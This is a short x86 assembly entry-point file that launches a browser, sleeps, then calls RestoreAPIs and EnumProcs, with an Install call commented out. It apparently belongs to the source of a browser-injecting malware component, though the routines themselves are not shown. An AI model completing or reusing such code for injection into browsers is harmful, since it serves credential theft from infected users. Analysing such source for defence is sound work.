.686
.model flat, stdcall
option casemap : none

;	DEBUGMODE = 1

	include INCLUDES.ASM


.code

;; ==================================================================================================== ;;
;; NORMAL_START - program entry point                                                                   ;;
;; ==================================================================================================== ;;
NORMAL_START proc

;	invokx  WinExec, 'C:\Program Files\Internet Explorer\iexplore.exe', SW_SHOW
	invokx  WinExec, 'C:\Program Files\Mozilla Firefox\firefox.exe', SW_SHOW
;	invokx  WinExec, 'C:\Documents and Settings\NB\Local Settings\Application Data\Google\Chrome\Application\chrome.exe', SW_SHOW
	invoke  Sleep, 2000

	xor  ebx, ebx

	invoke  RestoreAPIs

;	invoke  Install

	invoke  EnumProcs

	invokx  _ExitProcess, 0
NORMAL_START endp
end NORMAL_START

